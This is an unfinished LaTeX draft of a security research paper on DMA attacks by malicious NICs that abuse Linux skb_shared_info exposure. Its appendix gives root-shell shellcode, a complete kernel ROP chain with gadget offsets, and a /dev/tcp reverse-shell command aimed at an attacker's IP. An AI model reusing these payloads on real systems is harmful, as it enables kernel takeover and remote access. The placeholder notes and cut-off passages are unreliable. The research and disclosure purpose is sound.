\dkasan Is a run-time tool that has a large memory footprint and the obvious overhead of callbacks on each memory access. This tool is useful for testing specific systems for vulnerabilities.
\tool is a static analysis tool that may fail to follow a mapped variable due to potential code obfuscation like function pointers, macros and others, potentially resulting in a false-negative result. False-positive may happen in a rare case
%\adam{the footnote and its purposes are't clear. Bugs by who\textcolor{red}{\textbf{m}}? Tool writers (you) or kernel devs? And what exactly is the point?}\SV{Removed} 
where the mapped data structure crosses a  page boundary. In this case, \tool may flag a callback function, which may not be exposed, since it resides on a different page. Namely, only part of a data structure is accessible to the device due to the \subpage{} vulnerability at the mapped page, whereas the callback pointer resides on a different page which is not accessible to the device.%\adam{explain why this can happen}\SV{Is this what you were looking for?}
\section{Linux Network Stack}

\subsection{\shinfo}
The sk buff is a common data structure that is used in the Linux network stack to
hold information for representing a packet and is used by many network card drivers.
Basically, sk buff contains the packet’s metadata (e.g., its size and the protocol that
uses this packet) and several pointers to different locations in the data itself, which is
usually located in a different page (see Figure \footnote{Need Gil's figure}). The network stack supports packet
cloning by copying sk buff metadata and letting the new one point to the same data
as the old one. To support this data sharing, the skb shared info metadata structure
is located in a row with the data. Just as in the previous attack, skb shared info is
accidentally mapped for the device with the permissions of the packet (i.e., write for Rx
packets and read for Tx packets).
The main difference between this and the previous attack is that since the packet is
either Tx or Rx, but never both, we cannot deduce the virtual address of the packet as we did in the previous case. Hence, placing the payload in the same page is meaningless.

\subsection{Ring Flod}
To execute a successful DMA attack on an writable callback pointer; the attacking device needs a memory buffer filled with malicious code and the kernel address of that buffer.
Every RX packet is a possible buffer of malicious code, but the device is only given the buffer iova. The mapping between an iova and its kva is held in the device page table and the device driver meta-data; neither is accessible to the device. Additionally the \texttt{struct page} address is filled by the driver on RX but while we have write access we don't have read access. We must deduce a valid kva some other way.\newline
The boot process is deterministic; executing the same set of commands, initiating the same modules and allocating the same amount of memory each reboot. While the actual pages each module gets will vary in a multi-core machine due to timing issues, the drift is not expected to be to large. We evaluate this assumptions running 128 reboots on three Dell machines with different kernel versions. In the f\footnote{Please generate figure of RingFlod Results} we show the memory used by each driver and how many of the pfns repeat in more than X\% percent. Thus an adversary that has some knowledge about the physical setup and the kernel being used can guess with a high probability a valid kva for one of the RX pages. Whats left is to fill all the pages with a valid uarg struct with a callback pointer set back to it self, see fig \footnote{Need to generate a fig of a valid uarg}. Under the assumption of the default memory model\footnote{Figure out the memory model and show a calculation, best in figure}

\subsection{Privilege escalation}
sh\_info of a sent packet is read only to the NIC.
but if the \page holds malicious content that all the NIC needs. By copying the sh\_info of the TX skb to the sh\_info of an RX skb(can be generated at will). 
%T/O will happen 15 sec?

\subsection{Packet Forwarding}
Same can be achieved if the Linux sever allows for packet forwarding\footnote{Need to check what happens to sh\_info, (1.can we carry an "invisible" sh\_info - we can, but doesn't work as you need the driver to fill the kva) 2. or just forward a packet with frags (MTU, is usually a limiting factor)}

\subsection{sh\_info co-location breaks strict}
Additional challenge with attacking the sh\_info is the fact the the fields are filled and rewritten by the driver. As it turns out this is not a problem as multiple device drivers \footnote{make sure to get list from Gil's Thesis} first create an skb and only then unmap, allowing the device ample opportunity to annul the changes made by the driver. But even when the order is correct; the default mode in Linux us deferred protection and although the page was unmapped the device can still access it via the IOTLB. In the case of the strict protection, the device can still rewrite sh\_info due to the way sh\_info is allocated. 
\subsubsection{When page frags are used indiscriminately}
Unfortunately the following is not found in nature...\newline
In case where both TX and RX sh\_info come from the same page frag. The NIC can read arbitrary kernel addresses by modifying the frag list of a TX skb and making the driver map random addresses.
Being able to read the NIC can generate a large RX packet an just read the sh\_info frag written by the driver and 
\clearpage
\section{Additional Compound attacks}

\subsection{eXpress Data Path}\label{sec:xdp}

eXpress Data Path (XDP)~\cite{xdp} provides a way for users to add custom handling to RX buffers with little overhead. Common use cases include DDOS mitigation, forwarding and load balancing. To support the latter, the RX buffers are mapped with BIDIRECTIONAL access to the NIC. 

The tg3 driver does not support XDP. XDP support is usually added to high-speed NICs, such as ConnectX-4 (mlx5\_core). Accordingly, in this attack, we focus on the mlx5\_core driver, which, as mentioned in Sec, \ref{sec:forward}, does not unmap the RX buffers and reuses the pages using the page\_pool mechanism \cite{page_pool}. Subsequently, these pages are never unmapped, and remain accessible to the device for both reading and writing. 

The fact that the NIC has both read and write access to \shinfo, allows the NIC to execute an attack in 4 steps (Fig. \ref{fig:gro_xdp}):
\begin{enumerate}
    \item An RX TCP packet is generated. Then, the \shinfo{} is initialised by the driver and the \texttt{frags} are filled with NULL pointers. Finally, the packet is handed to the next layer.
    
    \item A second RX \skb{} is generated as part of the same TCP stream, initialized and also handed to the next layer.
    
    \item Both packets reach the GRO layer. Then, the second \skb{} is coalesced with the first packet, the \skb{} is freed and the \data{} is added as a \texttt{frag} to the first \skb.
    
    \item The NIC reads the updated \texttt{frag} field and translates the \page{} address to a valid \kva{}. Finally, the device fills the \texttt{destructor\_arg} field, creating a poisoned \skb{} (Fig. \ref{fig:sh_info}).
\end{enumerate}

The difference between this flow and a regular receive flow is the additional read capability the NIC has due to XDP. That is, the last step, where \means{} is obtained, is possible only due to the additional READ access.

\smallskip
\noindent\textbf{Remark.} Other drivers that have XDP support, also tend to map RX buffers with BIDIRECTIONAL (e.g., bnxt, i40e, mlx4\_en). Interestingly, the mlx5\_core driver has two modes of operation: (1) linear - where an skb is built around an RX buffer and, (2) non-linear where the driver is filling up the \texttt{frags} of \shinfo, which was never mapped. The former is the default, and the later is actually secure. The non-linear mode is secure because \shinfo{} is \emph{never} accessible to the device. Thus the NIC never gains the \oportunity{} to attack.

\begin{figure*}[t]
    \centering
    \includegraphics[width=\linewidth]{figs/gro.pdf}
    \caption{An RX \skb{} after GRO used as a \means{} for a DMA attack.}
    \label{fig:gro_xdp}
\end{figure*}

\subsection{Forward Thinking}\label{sec:forward}

Packet forwarding is a standard Linux feature that allows a Linux machine to serve as a router or a load balancer. Packet forwarding functionality is usually disabled by default on Linux servers.

When this functionality is enabled, the NIC can independently generate an RX packet to a legitimate destination. This packet will then be forwarded to become a TX packet. However, unlike in the TCP layer that usually creates \skb{} packets with fragments, both the tg3 and the mlx5\_core drivers, usually create a linear \skb{}.

Namely, the drivers do not fill the \texttt{frags}, which the attacker uses to obtain \means{}. Both drivers, use the \texttt{napi\_gro\_receive} function to pass the \skb{} to the upper layer (this is the standard for most NIC drivers\footnote{Used by 98 NIC drivers, in Linux 5.0}). 

In this case, the upper layer is the Generic Receive Offload (GRO) layer \cite{gro}. GRO attempts to aggregate multiple TCP segments into a single large packet. Specifically, GRO converts multiple linear \skb{} buffers (belonging to a single TCP stream) into a single \skb{} with multiple fragments. This \skb{} then traverses the Linux network stack and becomes a TX packet. The attacker can use this TX packet as described in the previous attack (Fig. \ref{fig:payload}).

Packet forwarding, also opens up an additional attack option. An attacker might be interested in persistent surveillance rather than overtaking the machine. 

Packet forwarding allows the NIC to inspect arbitrary pages at will. 
Instead of sending a TCP packet and letting the GRO layer fill in the \texttt{frags} information, the NIC can generate a small UDP packet and fill in the \texttt{frags} array with any arbitrary \page{} addresses within the system. This results in the mapping of these pages by the driver, providing READ access to any page in the system to the NIC. Both the mlx5\_core and tg3 drivers map all the frags in \shinfo{} without verifying the actual packet length.

To avoid detection and, more importantly, preserve OS stability, the device must undo the changes to \shinfo{} before creating a TX completion. That is, before letting the CPU know that the packet was sent and its buffer can now be freed. Otherwise, the OS will try freeing the pages, indicated by \shinfo.

\smallskip
\noindent\textbf{Remark.} Having an accomplice in the form of an unprivileged user provides an additional vectors of attack. In addition to running ROP attacks, the NIC can also leak the content of arbitrary memory pages to the user. Assuming that the NIC has WRITE access to \shinfo{} after it has been sent up the network stack (for example, in case of deferred protection or when page\_pool is used, Sec. \ref{sec:xdp}), the NIC can modify the \page{} address in the \texttt{frag} entries, letting the Linux network stack copy the context of arbitrary memory pages to an unprivileged user. A likely side effect of this attack is memory corruption and Kernel panic, so caution is advised. The reason being, that the \texttt{skb\_free} function attempts to free pages never owned by the network stack.

\section{\textcolor{blue}{Attack Demonstrations}}\label{Sec:setup}

%\adam{poor title and section, it comes out of nowhere. Title should be ``Attack Demonstrations,'' ``Discovered Attacks'' or something like that. The section should start with what are now the later paragraphs, saying you found attacks and are going to describe them. Last thing should be the setup, in a para heading.}\SV{Fixed}

We implement and demonstrate \compound attacks against the Linux kernel network stack. 
In order to demonstrate an attack by a malicious NIC, we use a FireWire device similarly to Sang et al.,~\cite{SLND10}. To emulate an attack by a malicious NIC using a FireWire device, we create an \iova{} page table sharing between the FireWire and the actual NIC. \sout{A minor patch is needed for the victim OS to facilitate this emulation.} This way, the attacker machine can access the same pages as the NIC. This allows us to execute an attack using a programmable interface, emulating a malicious NIC. \sout{This minor patch is only needed to emulate a device. The core OS was unchanged.}


We create a malicious FireWire device by modifying the Linux-IO Target (LIO) subsystem on the attacker machine. The LIO subsystem supports hard disk emulation for remote computers via the \spb{} protocol. \sout{In an extended version, we will provide the source code for a previously unknown \simple attack on the Linux kernel focused on the FireWire subsystem (which also exposes Thunderbolt/USB-C and other ports with FireWire adapters to DMA attacks.)}


\paragraph{Test Setup}
We use a 28 core Dell PowerEdge R730 server, with Ubuntu 18.04 (kernel version 5.0), as our victim machine. This server is equipped with \textcolor{red}{an} Intel VT-d IOMMU, a Broadcom NetXtreme BCM5720 Gigabit Ethernet NIC, a Mellanox Technologies ConnectX-4 Ethernet NIC and VIA Technologies, Inc. VT6315 Series Firewire Controller. An identical machine connected to the victim via a FireWire cable acts as the attacker. 

\paragraph{Executed attacks}
\textcolor{red}{We used the \textit{Ring Flood} attack on the \texttt{skb\_shared\_info} structure to execute code in the kernel.
Our exploit places a ROP gadget on the DMA buffer page. To execute the ROP gadget, the device points the struct's callback pointer to a JOP gadget in the kernel. The kernel passes the callback a this pointer (in the \%rdi register) to its containing struct. Thus, in our case, this pointer contains the DMA buffer's address, so all we need is a JOP gadget that conceptually performs \texttt{\%rsp = \%rdi + const}. We locate such a gadget using the ROPgadget tool.\footnote{\url{https://github.com/JonathanSalwan/ROPgadget}}}

\section{Applicability to \DIFdelbegin \DIFdel{other }\DIFdelend \DIFaddbegin \DIFadd{Other }\DIFaddend OSs}\label{sec:other_os}

%\begin{table*}[t]
%\begin{adjustbox}{max width=0.9\textwidth}
%\begin{tabular}{l|ccccccc}
%OS                           & default mode & IOVA map   & memory isolation    & KASLR &  Known Vulnerability & Fix in later versions \\ \hline

%Windows 10  & \V   & \V & \X & \V   & \textcolor{red}{Yes}       & partial   \\
%MacOS       & \V   & \X & \X & \V   & \textcolor{red}{Yes}       & partial   \\
%FreeBSD     & \X   & \V & \X & \V   & \textcolor{red}{Yes}       & No   \\
%Linux       & \V   & \V & \X & \V   & \textcolor{green}{No}      &  \\\hline       
%\end{tabular}
%\end{adjustbox}
%  \caption{IOMMU adaptation in different OS's.}
%  \label{tab:other_os}
%\end{table*}

%\begin{table*}[t]
%\begin{adjustbox}{max width=0.9\textwidth}
%\begin{tabular}{l|ccccccc}
%OS                           & default mode & IOVA map   & memory isolation    & KASLR &  DMA Vulnerability & previously unknown          \\ \hline

%Windows 10  & \V   & \V & \X & \V   & likely        &    \\
%MacOS       & \V   & \X & \X & \V   & likely        &    \\
%FreeBSD     & \X   & \V & \X & \V   & demonstrated  &    \\
%Linux       & \V   & \V & \X & \V   & compound      & \V \\\hline       
%MacOS \textless 10.12.4      & supported     & On       & shared     & dedicated & Yes   & demonstrated             \\
%Windows 10 \textless 1803    & Not supported & N/A          & N/A        & shared    & Yes   & demonstrated         \\
%MINIX 3                      & supported     & On       & per device          & dedicated & No    & unknown                  \\\hline
%Linux                        & supported     & On     & per device & shared    & Yes   & \textbf{\begin{tabular}[c]{@{}c@{}}demonstrated in this paper \\ (previously unknown)\end{tabular}} \\\hline       
%\end{tabular}
%\end{adjustbox}
%  \caption{IOMMU adaptation in different OS's.}
%  \label{tab:other_os}
%\end{table*}

%\adam{strange title. Perhaps call it: Applicability to Non-Linux OSs}\SV{Better?}
The current state of IOMMU adaptation varies among different OS vendors. We briefly discuss other \DIFdelbegin \DIFdel{OSes }\DIFdelend \DIFaddbegin \DIFadd{OSs }\DIFaddend below.

\smallskip
\noindent\textbf{Windows.} Until recently\DIFdelbegin \DIFdel{(2019) }\DIFdelend \DIFaddbegin \DIFadd{, }\DIFaddend Windows had no IOMMU support, exposing it to \simple DMA attacks.
In 2019\DIFdelbegin \DIFdel{(}\DIFdelend \DIFaddbegin \DIFadd{, }\DIFaddend with build 1803\DIFdelbegin \DIFdel{) }\DIFdelend \DIFaddbegin \DIFadd{, }\DIFaddend Microsoft introduced Kernel DMA Protection \cite{ms_iommu}, which provides IOMMU protection by default with a dedicated I/O page table per device. 
In addition, network buffers are allocated from dedicated pools of memory, limiting the possible exposure of sensitive data. However, a brief exploration of the Windows Networking drivers\DIFaddbegin \DIFadd{' }\DIFaddend API reveals functions \DIFdelbegin \DIFdel{like }\DIFdelend \DIFaddbegin \DIFadd{such as }\DIFaddend \emph{NdisAllocateNetBufferMdlAndData} \cite{ms_single} that allocates a NET\_BUFFER structure and data in a single memory buffer, exposing the OS to \simple attacks. 
\DIFdelbegin \DIFdel{Note that the }\DIFdelend \DIFaddbegin \DIFadd{The }\DIFaddend NET\_BUFFER vulnerability was previously described \DIFaddbegin \DIFadd{by Markettos et al.}\DIFaddend \cite{thunder}. 

\smallskip
\noindent\textbf{MacOS.} IOMMU \DIFaddbegin \DIFadd{protection }\DIFaddend is enabled by default. It also uses dedicated memory for network I/O. MacOS, however, does expose the \textit{mbuf} data structure to the device, though with some precautions such as blinding the exposed callback pointer \textit{ext\_free} by XORing it with a secret cookie.
Indeed, this is sufficient to defend against \simple attacks. However, such an exposure of metadata opens up the \DIFdelbegin \DIFdel{MacOS }\DIFdelend \DIFaddbegin \DIFadd{macOS }\DIFaddend to potential \compound attacks.
%While stopping \simple attacks, such an exposure of metadata opens up the MacOS to potential \compound attacks. 
\DIFdelbegin \DIFdel{In particular, while }\DIFdelend \DIFaddbegin \DIFadd{Although }\DIFaddend the value of the secret cookie is random, \textit{ext\_free} can receive only one of two possible values. As a result, once an attacker compromises \DIFdelbegin \DIFdel{macOS }\DIFdelend \DIFaddbegin \DIFadd{MacOS }\DIFaddend KASLR (as demonstrated in \cite{thunder}), the random cookie is revealed by a single XOR operation.  
%\adam{how, if pointers are blinded? Explain.}\SV{let's discuss}

\smallskip
\noindent\textbf{FreeBSD.} An \textit{mbuf} struct \DIFdelbegin \DIFdel{which }\DIFdelend \DIFaddbegin \DIFadd{that }\DIFaddend is used for networking exposes the \textit{ext\_free} callback pointer. An attack on FreeBSD via this callback pointer was demonstrated by \DIFdelbegin \DIFdel{Merketos }\DIFdelend \DIFaddbegin \DIFadd{Markettos }\DIFaddend et al.~\cite{thunder}. To the best of our knowledge\DIFdelbegin \DIFdel{(}\DIFdelend \DIFaddbegin \DIFadd{, as of }\DIFaddend October 2020\DIFdelbegin \DIFdel{)}\DIFdelend , this vulnerability still exists in the FreeBSD kernel.

%\smallskip
%\noindent\textbf{Minix.} An honorable mention\adam{is this cynical? if so, remove it. if not, not clear why an honorable mention goes to an OS that in the next section we're told is vulnerable} goes to the Minix micro-kernel\cite{minix} which is present on Intel chipsets. It has been shown to have a DMA vulnerability at initialization time\cite{minix_intc}. The MINIX micro-kernel pre-allocates memory for I/O and copies in/out any sent/received data bytes, effectively stopping known DMA attacks. 
%\adam{suggest removing Minix. who cares?}

\section{Related Work}
We cover DMA attacks in the presence of IOMMU, defenses, and emerging ROP mitigation techniques.

\smallskip
\noindent\textbf{DMA attacks in the presence of IOMMU.}
Beniamini demonstrated attacks on cellular devices, e.g., the iPhone 7 and Nexus 5/6/6P, through their Wi-Fi chips~\cite{Ben17a, Ben17b}. While Nexus phones do not use an IOMMU, iPhones do. Beniamini, however, attacked the CPU by exploiting a TOCTTOU (Time of Check To Time of Use) vulnerability in the NIC driver. From an I/O point of view, all the DMA writes were still legal (i.e., only to buffers currently mapped to the NIC). A recent paper~\cite{thunder} has introduced an FPGA tool that perpetrates DMA attacks. They have shown several \simple DMA attacks on Windows, MacOS, and FreeBSD.

\smallskip
\noindent\textbf{Adressing IOMMU vulnerabilities.}
Boyd-Wickizer and Zeldovich~\cite{BWZ10} and LeVasseur et al.~\cite{LUSG04} suggested isolating unmodified device drivers in user space programs and virtual machines, respectively. Similarly, Cinch used an isolated red virtual machine for intercepting bus traffic~\cite{AWH16}. These methods could be applied to limit the damage of potential attacks in addition to other protection mechanisms. They do not, however, prevent code execution in an isolated environment. By attacking the isolation mechanism, attackers might still compromise the entire system.

Markuze et al. suggested that the IOMMU driver should use bounce buffers~\cite{MMT16}. Typically, device drivers invoke map/unmap requests for desired buffers through the DMA API. According to their suggestion, instead of dynamically mapping/unmapping pages, the DMA backend would copy the buffer to/from designated pages with fixed mapping. By keeping separate data pages for each device, they avoid data co-location and, as a result, eliminate the sub-page granularity vulnerability. Since the mappings are static, the issue of deferred invalidation is eliminated as well. 
%
Nevertheless, this solution imposes a large overhead of data copying and memory wastage. In a later work, Markuze et al. suggested reducing these overheads by implementing the DMA-Aware Malloc for Networking (DAMN)~\cite{MSMT18}. The security of the system still depends on developers avoiding mistakes (e.g., not using \texttt{build\_skb}) and does not provide a solution for packet forwarding or zero-copy I/O (e.g., \texttt{sendfile}, XDP~\cite{xdp}). %Furthermore, these ideas have yet to be introduced or even proposed to the Linux community, rendering current deployments at high risk.
%Previous works have painted DMA attacks in broad strokes only, without delving into details~\cite{MMT16,MSMT18,thunder}.

%Several hardware mechanisms exist for protecting CPU buffers smaller than a page. These mechanisms could be implemented in the IOMMU in order to mitigate the sub-page vulnerabilities. 
Intel’s sub-page protecting technology suggests protecting fixed-sized buffers smaller than a page~\cite{Int18}. Since the buffers are still fixed-sized, the same vulnerability remains, albeit in a more limited way. Intel MPX (Memory Protection Extensions) lets the user define boundaries for buffers and, later, explicitly checks that the corresponding pointers are between these boundaries~\cite{Int16a}. Oracle SSM (Silicon Secured Memory) lets the user \emph{color} buffers and associative pointers~\cite{Ora15}. The color is implicitly checked for a match at each memory access. MPX, SSM, and other similar approaches may be used for building a secure alternative to IOMMU. 

\smallskip
\noindent\textbf{Emerging ROP mitigation techniques.}
Intel Control-Flow Enforcement Technology (CET) is a new instruction set for mitigating ROP attacks~\cite{Int17}. Processors that support CET use two stacks simultaneously instead of the regular one, with the new shadow stack having only return addresses rather than a full copy of the data. During each RET command, the address in the shadow stack is checked, and the code continues running only if the stacks agree on the address. Even if an attacker manages to control the regular stack, the shadow stack prevents the attack. Also, each legitimate indirect jump target is marked with a special instruction. Thus, it is impossible to jump to arbitrary locations in the code, and JOP attacks are also prevented. Similarly, each legitimate call target is also marked. De Raadt recently announced the Kernel Address Randomized Link (KARL) for OpenBSD~\cite{dr17}. Each time the system is booted, it links a new, randomized kernel binary. This is strong randomization (as opposed to Linux’s KASLR), making it harder to patch the payload during runtime. 

%Both KARL and CET should successfully mitigate simple ROP/KASLR attacks whenever widely applied.


\section{Discussion and conclusions}

Once a malicious device exists, launching a DMA attack boils down to connecting the device to an external port and only for a few seconds. Furthermore, recent leaks from clandestine agencies show that they have been attacked by both shipping infected hardware \cite{Gal14} and connecting external malicious devices \cite{Fin14}. Namely, no DMA attack could work without the unintentional exposure of restricted fields.

\begin{comment}
\footnote{\url{https://lore.kernel.org/lkml/20180510230948.GF190385@bhelgaas-glaptop.roam.corp.google.com/}}.
\end{comment}

As we demonstrate in this paper, the blame is not with the device drivers alone, rather, more often it is the OS design choices that open up the system to DMA attacks. With the existing API used for I/O operations and due to performance considerations, it is extremely difficult not to create a \subpage{} vulnerability. Thus, even well-written drivers can be subverted by the OS (e.g., bnx2 by deferred protection). Examples to this include:

\begin{enumerate}
    \item API: 
    \begin{itemize}[wide, labelwidth=!, labelindent=0pt]
        \item The \textit{dma\_map\_single} call accepts a pointer and the buffer length. This API insinuates that only the mapped bytes are exposed, when, in fact, the whole page is accessible.
        \item \textit{dma\_unmap\_single}, insinuates that the buffer is not accessible to the device after the call. This does not hold both due to deferred protection and type (c) \subpage{} vulnerabilities.
        \item \textit{build\_skb} facilitates building an \skb{} around an arbitrary I/O buffer, in turn, embedding critical data structures inside an I/O buffer.
        \item While \texttt{page\_frag} is an efficient allocator, it inherently creates a type (c) \subpage{} vulnerability.
    \end{itemize} 
    \item Tools/Infrastructure: 
    \begin{itemize}[wide, labelwidth=!, labelindent=0pt]
            \item \texttt{page\_pool} API, by caching I/O buffers and avoiding expensive unmaps, the drivers \emph{circumvent} the security techniques of the OS. 
            \item \shinfo{} is by design built within an I/O buffer. Avoiding type (b) \subpage{} vulnerabilities imposes a challenge.
            \item No dedicated allocates for I/O such as proposed in previous works (e.g., \cite{MSMT18,MMT16}).
    \end{itemize}
\end{enumerate}

We contend that a better API and better mechanisms can provide driver authors with better options for writing secure and performant device drivers. Specifically, for \shinfo{}, which is ingrained in the Linux network stack, we urge the use of pointer obfuscation \cite{Coo17}, and solely non-linear RX buffers as an alternative to a new design. Additionally, we urge the use of analysis tools that detects \subpage{} vulnerabilities and offer \tool{} and \dkasan as a starting point towards a more secure DMA.


%\smallskip
%\textcolor{olive}{Its important to note, that while our static analysis tool is able to flag potential \simple vulnerabilities fairly easily; the tool has trouble \compound attacks, due to the complexity of the kernel. This work also does not claim to cover all possible \compound attacks, and only provides a glimpse at the possible. Several attacks we have considered, but were not able to implement. We could modify the \emph{accomplice} attack, in a way that the user send a callback pointer in user space instead of a ROP attack, this attack unfortunately doesn't work due to Kernel smep/smap defences. Another attack; can exploit attempt exploiting ICMP packets. In the ICMP code we have noticed that RX skbs can be reused as TX skbs in ICMP replies. Eventually, we couldnt generate a flow that fill force such a reuse; this might just be because of lack of trying on our part. Forcing such a scenario is helpful to an attacker, with write access to \shinfo{}, for a TX packet can create a scenario allowing a memory dump just like we have shown.... :(- All Ive got... }

%\SV{modified... still requires some work}

%It is also important to note that while our static analysis tool is able to flag potential \simple{} vulnerabilities fairly easily, the tool is less efficient in detecting a potential to \compound{} attacks, mainly, due to the complexity of the kernel. That is, while the tool detects potential trifecta members, there is a need for a human expert to analyze the findings. 

%This work also does not claim to cover all possible \compound{} attacks, and only provides a glimpse at the possible using the trifecta principle. 

%That are also several attacks that we have considered but were not able to successfully execute: (1) we attempted to modify the \emph{accomplice} attack in a way that the user sends a callback pointer in user space instead of a ROP attack. This attack fails due to the Kernel smep/smap defences; (2) we attempted to exploit ICMP packets. In the ICMP code we have noticed that RX skbs can be reused as TX skbs in ICMP replays. Eventually, we could not generate a flow that fill force such a reuse. \SV{next sentence is unclear}Forcing such a scenario is helpful to an attacker, with write access to \shinfo{}, for a TX packet can create a scenario allowing a memory dump.


\bibliographystyle{plain}
\bibliography{references}

%\appendix

%\newpage

\section{Shell Code}\label{apx:shellcode}

To open the new shell, we use a Linux kernel functionality allowing the spawning of user processes with root privileges. It is possible to both lunch a local shell with root access using,
 $$\textbf{\nobreak ``/sbin/getty -aroot tty9''},$$
and open a remote shell, providing root access to a remote user with,
$$\textbf{\nobreak ``/bin/bash -c /bin/bash$>$\&/dev/tcp/{\normalfont \emph{attacker's IP}}/{\normalfont \emph{port}}$<$\&1''}.$$

\begin{figure}[h]
        \begin{verbatim}
;push ``/sbin/getty -aroot tty9''
mov  rax, 0x003979747420746f
push rax
mov  rax, 0x6f72612d20797474
push rax
mov  rax, 0x65672f6e6962732f
push rax

xor  rdi, rdi
mov  rsi, rsp
xor  rdx, rdx
mov  rax, <argv_split>
call rax

mov  rdi, qword [rax]
mov  rsi, rax
xor  rcx, rcx
mov  rax, <call_usermodehelper>
call rax

pop  rax
pop  rax
pop  rax
ret
        \end{verbatim}
        \caption{Shell code for spawning a new local root shell.}
        \label{fig:shellcode_1}
\end{figure}


\clearpage

\begin{figure}[b]
        \begin{lstlisting}[
        basicstyle = \footnotesize,
        columns = fullflexible,
        %frame = l,
        language = C
        ]
KERNEL_BASE := 0xffffffff81000000; // patch using leaked pointers
ATTACK_PAGE := 0xffff880043430000; // arbitrary selected address

// Fake ubuf_info structure, starting with the callback pointer.
// This is the entry point of the attack.
page[0x000] = KERNEL_BASE + 0x6b511d; // call qword ptr[rdi + 0x3b0]

// pivoting code
page[0x3B0] = KERNEL_BASE + 0x1091fd; // mov rax, qword ptr [rdi + 0x68] ;
                                            // mov rbp, rsp ; call qword ptr [rax]
page[0x068] = &ATTACK_PAGE[0x100];
page[0x100] = KERNEL_BASE + 0x2499c1; // mov rax, qword ptr [rax + 0x38] ;
                                            // call qword ptr [rax + 0x28]
page[0x138] = &ATTACK_PAGE[0x200];
page[0x228] = KERNEL_BASE + 0x16fab6;   // mov rbx, qword ptr [rax + 8] ;
                                            // mov rdi, rax ; call qword ptr [rax]
page[0x208] = &ATTACK_PAGE[0x210];
page[0x210] = KERNEL_BASE + 0x1319ee; // push rax; jmp qword ptr[rcx]
page[0x200] = KERNEL_BASE + 0x2499c1; // mov rax, qword ptr [rax + 0x38] ;
                                            // call qword ptr [rax + 0x28]
page[0x238] = &ATTACK_PAGE[0x300];
page[0x328] = KERNEL_BASE + 0x2ccb61; // mov rcx, qword ptr[rax + 8] ;
                                            // mov rdi, rax; call qword ptr[rax]
page[0x308] = &ATTACK_PAGE[0x310];
page[0x310] = KERNEL_BASE + 0x159c86; // pop rsp ; ret
page[0x300] = KERNEL_BASE + 0x20fb7b; // mov rax, qword ptr[rax + 0x30] ;
                                            // mov r8, qword ptr[rax + 0x40] ;
                                            // call qword ptr[rbx]

page[0x330] = &ATTACK_PAGE[0xF68]; // our new stack :)

// ``/sbin/getty -aroot tty9''
page[0x400] = 0x65672f6e6962732f;
page[0x408] = 0x6f72612d20797474;
page[0x410] = 0x003979747420746f;

// helping pointers
page[0x500] = KERNEL_BASE + 0x0d7b05; // pop rsi; ret
page[0x508] = KERNEL_BASE + 0x12dacd; // pop rdi; ret

// stack
page[0xF68] = KERNEL_BASE + 0x0d7b05; // pop rsi; ret
page[0xF70] = &ATTACK_PAGE[0x400];
page[0xF78] = KERNEL_BASE + 0x12dacd; // pop rdi; ret
page[0xF80] = 0;
page[0xF88] = KERNEL_BASE + 0x11bac2; // pop rdx ; ret
page[0xF90] = 0;
page[0xF98] = KERNEL_BASE + 0x3a00d0; // &argv_split
page[0xFA0] = KERNEL_BASE + 0x005dfc; // pop rcx ; ret
page[0xFA8] = &ATTACK_PAGE[0x500];
page[0xFB0] = KERNEL_BASE + 0x1319ee; // push rax; jmp qword ptr[rcx]
page[0xFB8] = KERNEL_BASE + 0x5822a2; // mov rax, qword ptr [rax] ; ret
page[0xFC0] = KERNEL_BASE + 0x005dfc; // pop rcx ; ret
page[0xFC8] = &ATTACK_PAGE[0x508];
page[0xFD0] = KERNEL_BASE + 0x1319ee;// push rax; jmp qword ptr[rcx]
page[0xFD8] = KERNEL_BASE + 0x005dfc;// pop rcx ; ret
page[0xFE0] = 0;
page[0xFE8] = KERNEL_BASE + 0x0896a0; // &call_usermodehelper
page[0xFF0] = KERNEL_BASE + 0x4c0f0e; // xor rax, rax ; ret
page[0xFF8] = KERNEL_BASE + 0x003795; // leave ; ret
        \end{lstlisting}
        %\vspace{-5mm}
        \caption{
                ROP attack to open a remote shell on the attacker's machine. The pivoting code uses \texttt{rdi} register, which points to the page, providing \means{}.}
        \label{fig:shellcode_2}
\end{figure}



%The following command opens a remote shell on the attacker's machine.

%This shellcode size is less than 100 bytes, which means that it fits into a single writable page. We used the same page where the initial attack took place, when possible. Finally, for all attacks, 
%we validated that the shellcode was able to run when the computer is locked, successfully showing a gaining access scenario as well. 
%We also implemented improved versions of this shellcode: We implemented a ROP payload based on this shellcode in order to bypass DEP protection. For the basic case, we implemented both the ROP and the regular version using fixed kernel pointers (e.g., function calls). When kASLR was enabled, we patched the payload during attack execution. Lastly, we replaced the string \textbf{\nobreak ``/sbin/getty -aroot tty9''}, which opens a local shell, with the string \textbf{\nobreak ``/bin/bash -c /bin/bash$>$\&/dev/tcp/{\normalfont \emph{attacker's IP}}/{\normalfont \emph{port}}$<$\&1''}, which opens a remote shell on the attacker's machine. We used port 80 (HTTP) in order to bypass firewalls, but any port could be used.


%In (Fig. \ref{fig:shellcode_2} we show a ROP attack, based on the same Linux functionality to open a remote shell on the attacker's machine.

%

%\textbf{\nobreak ``/bin/bash -c /bin/bash$>$\&/dev/tcp/{\normalfont \emph{attacker's IP}}/{\normalfont \emph{port}}$<$\&1''},

%We implemented ROP payloads based on the shellcode used in the basic case (\ref{fig:shellcode_1}), showing that DEP could not prevent the attack. Using the ROP gadget tool1\footnote{https://github.com/JonathanSalwan/ROPgadget}, we searched Linux kernel binaries for gadgets that together achieve the same logic as the original shellcode. When we implemented the attack, we took advantage
%of the common practice of passing a ‘this’ pointer to a callback as the first parameter. According to the System V AMD64 ABI calling conventions (which Linux follows), the first parameter is passed in the rdi register, so the pivoting code can use it to find the new stack. Without it, we could not find the stack.
%We implemented two different versions, one for FireWire and one for NICs (Fig \ref{fig:shellcode_2}), of the ROP payloads. One minor difference between the versions is that in the network cards case, we used a modified OS and hence the binary was different. The more important difference is that in the NICs case, the callback was not pointed directly from the writable structure but had another level of indirection. As a result, the attacker could choose the address of the structure holding the callback and control rdi. This is essential for payload spraying, because the stack lies in the sprayed page, which has an arbitrary address. In the FireWire case, rdi is always pointing to the attacked sbp2 management orb, forcing the stack to be in the same page.

%\newpage
\section{Driver lists}
These lists are based on Linux kernel 5.0. 
\subsection{drivers - DMA\_BIDIR}
\begin{enumerate}
    \item bnxt
    \item cxgb4
    \item dpaa2
    \item i40e
    \item ixgbe
    \item mlx4
    \item mlx5 - Driver safe
    \item myri10ge
    \item qede
    \item ti
    \item ath9k - EDMA
    \item iwlwifi
\end{enumerate}
